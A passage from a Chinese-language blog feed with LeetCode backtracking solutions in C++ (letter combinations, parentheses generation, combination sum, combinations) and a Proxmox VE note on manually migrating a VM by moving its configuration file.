</p><p>參數說明:</p><ul><li><code>int depth</code>: 用於紀錄當前深度</li><li><code>string current</code>: 用於保存當前組合</li><li><code>digits</code>: 用於傳遞題目給的數字字串</li></ul><p>至於backtracking的邏輯，跟往常一樣透過一個 <code>void letterhelper</code> 函數來去進行，其中終止條件就是一旦當前深度到達題目給的 <code>digits</code> 長度，就將當前的組合 <code>current</code> 加入到回傳向量中。</p><p>接著 <strong>要去迭代 hashtable 中不同數字對應到的字母組合</strong>，但在這之前要注意 <strong>由於<code>unordered_map</code> 僅接受以string宣告，不能用 <code>char</code></strong> ，但我們需要取出題目中的個別 <strong>數字字元</strong> (Ex. <code>2</code>) 所以下面透過 <code>string(1, digits[depth])</code>   來取獲取當前深度下的數字，並且將其轉換為長度為1的字串存成另一個變數 <code>digit</code>，這樣才有辦法對 <code>umap</code> 進行操作。</p><p>接著迭代不同字母組合，去遞迴呼叫 <code>letterhelper</code> 呼叫時給定的參數要讓 <code>depth</code> +1，傳遞給下一層，並且要讓 <code>current</code> 字串加入當前嘗試的字母。 一旦全部結果嘗試完畢後就回傳結果 <code>results</code>。</p><blockquote><p><code>unordered_map</code> 的用法可以參考 <a href="https://notes.boshkuo.com/docs/C++/STL/unordered_map">這篇</a></p></blockquote><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/17/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>對於遞迴函數 <code>letterhelper</code> 會根據數字對應的字母集合進行遞迴呼叫，每個數字大約對應 3-4 個字母，因此所有可能的組合數會是 $O(4^{n})$ 其中 $n$ 為 <code>digits</code> 的長度，而每個組合的生成也會進行字母拼接 <code>current+umap[digit][i]</code> 但這會是雜湊表的常數操作 $O(1)$。</p><p>所以每個遞迴深度的時間消耗是 $O(1)$ 但會重複 $O(4^{n})$ 次，因此整體的時間複雜度會是 $O(4^{n})$。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p><code>results</code> 用於儲存最終組合結果，空間大小取決於組合數量，最多會有 $O(4^{n})$ 組合，每個組合長度為 <code>n</code> 因此佔用空間為 $O(n \cdot 4^{n})$，而遞迴占用stack大小為 $O(n)$，因此整體空間複雜度會是 $O(n \cdot 4^{n})$。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
            <tag> combinations </tag>
            
            <tag> hash table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>產生括號 | Medium | LeetCode#22. Generate Parentheses</title>
      <link href="/posts/8c983568.html"/>
      <url>/posts/8c983568.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/22/question.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 給定 <code>n</code> 組括號，請產生所有可能的閉合括號的組合</li></ul><div class="note info flat"><p>反正就是沒有 <code>(()</code> 或者是 <code>)()</code> 類似這樣的組合</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題求組合的所有可能性，所以想法上一定還是 backtracking，但今天的問題會是要怎麼樣 <strong>控制括號能夠閉合</strong>，以 backtracking 的解題架構來看，首先可以思考退回條件會是一旦每個組合中的長度到達了 <code>2 * n</code> 因為 <strong>會是 <code>n</code> 組括號</strong>，另外每一層中在選一定要先選左括號再選右括號，因此需要判斷當前右括號數量是否小於左括號，如果小於就代表一定至少有一組括號還沒閉合完畢。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;string&gt; parentheseList;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">generateParentheseshelper</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, vector&lt;string&gt; &amp;parenthese, string current, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(current.<span class="built_in">length</span>() == <span class="number">2</span>* n )&#123;</span><br><span class="line">            parenthese.<span class="built_in">push_back</span>(current);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(left &lt; n)&#123;</span><br><span class="line">            <span class="built_in">generateParentheseshelper</span>(left+<span class="number">1</span>, right, parenthese, current +<span class="string">&quot;(&quot;</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right &lt; left)&#123;</span><br><span class="line">            <span class="built_in">generateParentheseshelper</span>(left,right+<span class="number">1</span> ,parenthese,current +<span class="string">&quot;)&quot;</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">generateParenthesis</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        string temp=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">generateParentheseshelper</span>(<span class="number">0</span>,<span class="number">0</span>, parentheseList, temp, n);</span><br><span class="line">        <span class="keyword">return</span> parentheseList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面程式中一樣定義了一個 <code>generateParentheseshelper</code> 來去處理 backtracking 的邏輯，下面是參數說明：</p><ul><li><code>int left</code><ul><li>代表左括號目前出現在當前字串中的數量</li></ul></li><li><code>int right</code><ul><li>代表右括號目前出現在當前字串中的數量</li></ul></li><li><code>vector&lt;string&gt; &amp;parenthese</code><ul><li>用來儲存每一種組合的，返回用vector</li></ul></li><li><code>string current</code><ul><li>用來保存當前組合可能的字串變數</li></ul></li><li><code>int n</code><ul><li>題目給的括號pair 數量</li></ul></li></ul><p><strong>這裡的 bracking 終止條件是一旦所有括號都用掉，就將當前字串 <code>current</code> 加入到回傳vector <code>parenthese</code> 當中</strong>，這裡判斷一旦 <code>current</code> 的長度達到 <code>2 * n</code> 就會是括號都用掉。接著是每一層中需要做的事，這裡首先看左掛號數量如果小於 <code>n</code>  就會進入下一層，並且在參數地回傳遞的過程中將 <code>current + &quot;(&quot;</code> 放在函式參數中也是避免退回的時候，還需要再對 <code>current</code> 中的 <code>(</code> 去做處理，另外就是在傳遞時需要將左括號數量+1 <code>left+1</code>，接著就是需要判斷右括號的數量是否小於左括號 <code>right &lt; left</code> 如果小於就代表，一定存在括號是沒有閉合的，這時就需要去閉合括號，在進入下一層的參數中讓 <code>current + &quot;)&quot;</code>，這個過程中也需要讓右括號數量增加 <code>right+1</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/22/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>遞迴樹的高度，由於每個有效括號組合的長度為 $2n$，因此遞迴樹的深度為 $2n$</li><li>有效的解數量： 這裡可以透過<strong>卡塔蘭數</strong> 來計算，給定 <code>n</code> 對括號，有效組合數量為第n 個卡塔蘭數 $C_n &#x3D; \frac{1}{n + 1} \binom{2n}{n} &#x3D; \frac{(2n)!}{(n+1)!n!}$ 而這個值會為趨近於 $O(\frac{4^n}{\sqrt{n} \cdot n})$</li></ul><p>因此，遞歸會探索所有可能的括號組合，並剪枝掉無效組合。每一個有效組合需要 $O(2n)$ 的時間來生成，因此整體時間複雜度為： $O(\frac{4^n}{\sqrt{n}})$</p><blockquote><p><a href="https://zh.wikipedia.org/zh-tw/%E5%8D%A1%E5%A1%94%E5%85%B0%E6%95%B0">卡塔蘭數(Catalan Number)</a>，根據維基百科，<strong>其應用之一就是可以找出包含 N 組括號的合法運算式的個數</strong></p></blockquote><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>遞迴深度：$O(2n)$</li><li>結果列表大小用來保存所有組合可能，一共有 $O(\frac{4^n}{\sqrt{n} \cdot n})$ 個解，每個解長度為 2N，因此儲存所有解需要的空間為 $O(\frac{4^n}{\sqrt{n} \cdot 2n})$</li></ul><p>因此整體空間複雜度為 $O(\frac{4^n}{\sqrt{n} \cdot 2n})$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
            <tag> combinations </tag>
            
            <tag> parentheses </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>組合之和問題 | Medium | LeetCode#39. Combination Sum</title>
      <link href="/posts/e650f909.html"/>
      <url>/posts/e650f909.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/39/question1.png"></p><p><img src="/img/LeetCode/39/question2.png"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目會給一個整數陣列叫做 <code>candidates</code> 和一個目標整數 <code>target</code>，回傳一系列<code>candidates</code>的unique組合，其中對於每種組合中數字的總和要等於 <code>target</code>，可以以任何順序回傳各種可能。</li></ul><div class="note info flat"><p>在這個問題中，每個<code>candidates</code>中的數字可以被選擇無限次。若至少有一個數字被選擇的次數不同，那麼兩個組合即被視為唯一的。<br>Ex. <code>[2,2,3] != [2,2,2,2,3]</code><br>測試案例會保證在給定的輸入下，組成目標數字的唯一組合總數少於 150 個。</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>既然是組合問題，那就直接聯想到 Backtracking，另外由於這題與 <a href="https://leozzmc.github.io/posts/eb632302.html"><strong>77.Combinations 那篇</strong></a> 不同的是，這個沒有限制層數，因為題目也說了 <code>candidates</code> 中的數字可以被重複選擇無限多次，因此終止條件不會跟往常一樣是透過層數來做限制。</p><p>而可能會需要透過變數來在每次做選擇時儲存該值，並將變數值傳遞到下一層進行累加，最後在看是否與 <code>target</code> 相等。如果不相等就繼續選擇數字，另外與往常不同的是，由於可以重複選擇相同數字，因此進入每一層時，不用跳過原本的數字，可以重選。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">combinationHelper</span><span class="params">(<span class="type">int</span> currentVal, vector&lt;<span class="type">int</span>&gt; &amp;candidate, <span class="type">int</span> target, vector&lt;<span class="type">int</span>&gt; &amp;subResults, <span class="type">int</span> start)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(currentVal == target)&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(subResults);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(currentVal &lt; target)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt; candidate.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">                subResults.<span class="built_in">push_back</span>(candidate[i]);</span><br><span class="line">                <span class="comment">//currentVal += candidate[i];</span></span><br><span class="line">                <span class="built_in">combinationHelper</span>(currentVal + candidate[i], candidate, target,subResults, i);</span><br><span class="line">                subResults.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combinationSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; candidates, <span class="type">int</span> target)&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; sub;</span><br><span class="line">        <span class="built_in">combinationHelper</span>(<span class="number">0</span>,candidates, target, sub, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡我們一樣去定義了一個 helper function 來進行主要 backtracking 的處理，以下是參數說明:</p><ul><li><code>currentVal</code>：目前組合中數字的總和</li><li><code>candidate</code>：題目給的數字的列表</li><li><code>target</code>：題目給的目標值</li><li><code>subResults</code>：存放當前的組合的陣列</li><li><code>start</code>：控制數字的起始位置</li></ul><p><code>if(currentVal == target)</code> 為遞迴終止條件，代表找到值了。如果目前的總和 <code>currentVal</code> 小於目標值 <code>target</code>，則繼續從 <code>candiate</code>中選擇數字進行組合。這裡通過一個 for 迴圈來遍歷 <code>candidate</code>，從索引 <code>start</code> 開始從索引 start 開始，以確保不會出現重複組合。 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">combinationHelper</span>(currentVal + candidate[i], candidate, target, subResults, i)</span><br></pre></td></tr></table></figure><p>接著每次選擇一個數字 <code>candidate[i]</code> 後，將其加入當前的總和 <code>currentVal</code>，並繼續遞迴搜索下一個數字。<strong>這裡的 <code>i</code> 被傳遞給遞迴函數，意味著同一個數字可以多次選擇</strong></p><blockquote><p>我在這之前犯了一個錯誤就是寫成 <code>currentVal += candidate[i]</code> 然後傳遞 <code>currentVal</code>，<strong>但由於這樣做會累積 <code>currentVal 的變化</code>，無法在遞迴返回後正確還原 <code>currentVal</code> 的值，從而影響到整個搜索過程</strong></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subResults.<span class="built_in">pop_back</span>()</span><br></pre></td></tr></table></figure><p>回退到上一個選擇</p><p>一旦找到 <code>target</code> 後就會將陣列加入到 <code>result</code> 陣列中，最後回傳結果。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/39/result.png"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>在每一層遞迴中，我們都可以選擇任意的候選數字，這使得每個數字都可以被選擇多次，從而形成大量的組合。 每次選擇一個數字進行遞迴，會產生兩種選擇：<strong>選擇這個數字或不選擇。</strong><br>因此，當考慮所有可能的組合時，時間複雜度可以接近 $O(2^n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>Recursive Call<br>在最壞情況下，遞迴的深度取決於目標值 <code>target</code>。每次選擇一個數字進行遞迴，當總和不斷累加時，最深的遞迴層數可以達到 $O(target)$<br>每一層遞迴堆疊將會保存當前的狀態（包括參數），因此在最壞情況下的堆疊空間複雜度是 $O(target)$</li><li>Result storage<br><code>result</code> 用來存儲所有符合條件的組合。如果找到的組合數量為 <code>k</code>，而每個組合的平均長度為 <code>m</code>，則結果存儲所需的空間為 $O(k * m)$<br>在最壞情況下，組合的數量 k 可能接近於 $O(2^n)$，這是因為每個候選數字可以被多次選擇。每個組合的長度 m 在最壞情況下也可能接近於 <code>target</code></li></ul><p>因此，整體空間複雜度可以寫作：$O(target+k⋅m)$</p>]]></content>
      
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
            <tag> combinations </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手動 migration 的其他方式 | PVE 系列-3</title>
      <link href="/posts/bd2c9140.html"/>
      <url>/posts/bd2c9140.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 <a href="https://leozzmc.github.io/posts/c5581068.html"><strong>PVE 系列文章的第一篇</strong></a> 有示範在PVE的控制台上面進行 migration，而這裡紀錄另一種可以進行 Migration 的方式</p><h1 id="手動-Migration"><a href="#手動-Migration" class="headerlink" title="手動 Migration"></a>手動 Migration</h1><p>可以選擇先進入節點的 shell，接著進入 <code>/etc/pve/nodes</code> 目錄中，可以發現底下有相同cluster的所有節點</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@pve:/etc/pve/nodes# ls -l</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x 2 root www-data 0 Sep 10 11:06 pve</span><br><span class="line">drwxr-xr-x 2 root www-data 0 Sep 10 14:21 pve2</span><br></pre></td></tr></table></figure><p>接著進入目標節點 <code>pve2</code>，會發現裏頭有許多目錄，這裡跟 migration 有關的目錄會是 <code>lxc</code> 以及 <code>qemu-server</code> 這取決與你要 migrate 的是容器還是VM，如果要mirgate 容器就將 <code>lxc</code> 底下的設定檔移到目標節點的相同路徑底下，例如 <code>/etc/pve/nodes/pve/lxc/</code>。同理要移植 VM 也是，<strong>將 <code>qemu-server</code> 底下的設定檔移動到 <code>/etc/pve/nodes/pve/qemu-server/</code> 底下。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@pve:/etc/pve/nodes/pve2# ls -l</span><br><span class="line">total 2</span><br><span class="line">-rw-r----- 1 root www-data  102 Sep 11 14:09 config</span><br><span class="line">-rw-r----- 1 root www-data   83 Sep 22 14:40 lrm_status</span><br><span class="line">drwxr-xr-x 2 root www-data    0 Sep 10 11:06 lxc</span><br><span class="line">drwxr-xr-x 2 root www-data    0 Sep 10 11:06 openvz</span><br><span class="line">drwx------ 2 root www-data    0 Sep 10 11:06 priv</span><br><span class="line">-rw-r----- 1 root www-data 1675 Sep 10 11:06 pve-ssl.key</span><br><span class="line">-rw-r----- 1 root www-data 1688 Sep 10 11:06 pve-ssl.pem</span><br><span class="line">drwxr-xr-x 2 root www-data    0 Sep 10 11:06 qemu-server</span><br></pre></td></tr></table></figure><p>由於我們要移植的是VM，因此進入 <code>qemu-server/</code> 底下，可以發現有兩台 VM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@pve2:/etc/pve/nodes/pve2/qemu-server# ls -l</span><br><span class="line">total 1</span><br><span class="line">-rw-r----- 1 root www-data 451 Sep 22 14:47 101.conf</span><br><span class="line">-rw-r----- 1 root www-data 456 Sep 22 14:11 102.conf</span><br></pre></td></tr></table></figure><p>我們選擇移植 <code>VM 101</code>，那就把 <code>101.conf</code> 移動到另一個節點 <code>pve</code> 的對應目錄當中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv 101.conf ../../pve/qemu-server/</span><br></pre></td></tr></table></figure><p>接著我們可以去 <code>pve</code> 節點中查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@pve:/etc/pve/nodes/pve/qemu-server# ls -l</span><br><span class="line">total 1</span><br><span class="line">-rw-r----- 1 root www-data 452 Sep 22 14:11 100.conf</span><br><span class="line">-rw-r----- 1 root www-data 451 Sep 22 14:51 101.conf</span><br></pre></td></tr></table></figure><p>確定移動完成後，接著查看一下 VM 的狀態</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qm list</span><br></pre></td></tr></table></figure><p>會發現 <code>VM 101</code> 狀態是停止的，之後可以指令啟用VM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qm start 101</span><br></pre></td></tr></table></figure><p><img src="/img/PVE/qemu.png"></p><p>VM 移動完成，並啟用成功，順利運行~</p><h1 id="Migration-with-local-storage"><a href="#Migration-with-local-storage" class="headerlink" title="Migration with local storage"></a>Migration with local storage</h1><p>在 PVE 中，其實也可以透過現成命令來讓具有Local Disk的 VM 進行線上移轉:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qm migrate &lt;vmid&gt; &lt;targetnode&gt; --with-local-disks --online</span><br></pre></td></tr></table></figure><p>但實際測量後發現會耗費將近40分鐘時間進行移轉，並且僅僅只是一個 256GB Ubuntu VM</p><p><img src="/img/PVE/local.png"></p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><blockquote><p>這篇只是用來記錄可以用移動設定檔的方式來進行 migration</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Proxmox VE </tag>
            
            <tag> Virtual Machine </tag>
            
            <tag> Infrastructure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>組合問題 | Medium | LeetCode#77. Combinations</title>
      <link href="/posts/eb632302.html"/>
      <url>/posts/eb632302.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/77/question.png"></p><ul><li>題目難度: <code>medium</code></li><li>題目敘述: 給定兩個整數 <code>n</code> 和 <code>k</code>，求 <code>[1,n]</code> 範圍中，任意 <code>k</code> 個數字的所有組合可能，要用二維vector回傳。</li></ul><div class="note info flat"><p>其實數學意義就是要求 $C^{n}_{k} 的答案$</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的大方向也是 backtracking，並且思考方想跟 <a href="https://leozzmc.github.io/posts/713e66af.html">46.Permutations</a> 很像，骨幹一樣是一個 for 迴圈，迴圈代表每一層中要組合的數字，會去從 <code>[1,N]</code> 去進行組合，而由於數字不能重複，因此我們迴圈的初始值會給定一個變數 <code>start</code>，並且會在每次進入下一層時，去更新傳入的 <code>start</code>參數。如果抵達給定的層這裡也就是題目的 <code>N</code>，那就會退回，而這裡為了輸出最終結果，會將陣列添加到儲存最終結果的二維陣列中。 之後如同其他 backtracking 題目一樣，會回退，將原先占用陣列的值pop 出來，以便進行其他選擇。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; subArray;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">combinHelper</span><span class="params">(<span class="type">int</span> depth, <span class="type">int</span> K, <span class="type">int</span> N ,vector&lt;<span class="type">int</span>&gt; &amp;result_Subarray, <span class="type">int</span> start)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth == K)&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(result_Subarray);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=start; i&lt;=N; i++)&#123;</span><br><span class="line">            result_Subarray.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="built_in">combinHelper</span>(depth+<span class="number">1</span>, K, N ,result_Subarray, i+<span class="number">1</span>);</span><br><span class="line">            result_Subarray.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combine</span>(<span class="type">int</span> n, <span class="type">int</span> k)&#123;</span><br><span class="line">        <span class="built_in">combinHelper</span>(<span class="number">0</span>, k, n ,subArray, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>參數說明:</p><p><code>depth</code>：當前遞歸的深度，表示已經選了多少個數字<br><code>K</code>：目標組合大小（即最終選出 <code>K</code> 個數字）<br><code>N</code>：範圍上限（<code>1</code> 到 <code>N</code> 之間的數字）<br><code>result_Subarray</code>：目前的部分組合結果<br><code>start</code>：控制選擇下一個數字時的起始位置，以避免重複選擇相同的數字</p><p>遞迴邏輯：</p><p>當 <code>depth == K</code>，表示已經選了 <code>K</code> 個數字，則將當前的組合 <code>result_Subarray</code> 放入 <code>result</code> 中 。否則，從當前起點 <code>start</code> 到 <code>N</code> 去遞迴嘗試每個數字，將每個數字加入 <code>result_Subarray</code>，遞迴嘗試更大的數字，直到達到目標大小。回到上一層時，利用 <code>pop_back()</code> 來撤銷選擇，並且進行下一輪選擇。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/77/result.png"></p><h2 id="更好的做法"><a href="#更好的做法" class="headerlink" title="更好的做法"></a>更好的做法</h2><p>看到留言有提到這類型組合問題的答題模板，覺得挺好的也放上來</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">main</span>(...)&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;res;  <span class="comment">// Store the result, could be other container</span></span><br><span class="line">    <span class="built_in">backtrack</span>(res, ...);  <span class="comment">// Recursion function to fill the res</span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backtrack</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; res, <span class="type">int</span> cur, ..., vector&lt;<span class="type">int</span>&gt;vec)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(meet the end critria, i.e. cur reach the end of array)&#123;  </span><br><span class="line">        <span class="comment">//vec could be a certain path/combination/subset</span></span><br><span class="line">        res.<span class="built_in">push_back</span>(vec);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Current element is not selected</span></span><br><span class="line">    <span class="built_in">backtrack</span>(res, cur+<span class="number">1</span>, ..., vec);</span><br><span class="line">    <span class="comment">// Current element is selected</span></span><br><span class="line">    vec.<span class="built_in">push_back</span>(cur); <span class="comment">// or could be 